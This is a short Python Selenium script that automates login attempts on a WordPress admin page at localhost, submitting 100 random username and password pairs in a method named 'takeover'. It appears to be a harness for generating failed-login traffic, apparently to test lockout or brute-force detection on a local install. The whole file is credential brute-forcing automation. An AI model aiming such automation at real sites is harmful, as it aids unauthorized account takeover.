#!/usr/bin/env python3

from random import choice
from string import ascii_lowercase
from time import sleep

from selenium import webdriver

URL = "http://localhost/wp-login.php"


class Bot:
    def __init__(self):
        """
        Init bot
        """
        options = webdriver.ChromeOptions()
        # options.add_argument("--headless")
        self.driver = webdriver.Chrome(executable_path="../driver/chromedriver", options=options)

    def get_random_string(self) -> str:
        """
        Generate random string for credentials
        :return: random ascii string
        """
        return "".join([choice(ascii_lowercase) for _ in range(8)])

    def takeover(self) -> None:
        """
        Brute credentials for admin console
        :return: None
        """
        self.driver.get(URL)

        for _ in range(100):
            login = self.get_random_string()
            passw = self.get_random_string()
            self.driver.find_element_by_id("user_login").send_keys(login)
            self.driver.find_element_by_id("user_pass").send_keys(passw)
            self.driver.find_element_by_id("wp-submit").click()
            sleep(0.5)


if __name__ == "__main__":
    bot = Bot()
    bot.takeover()
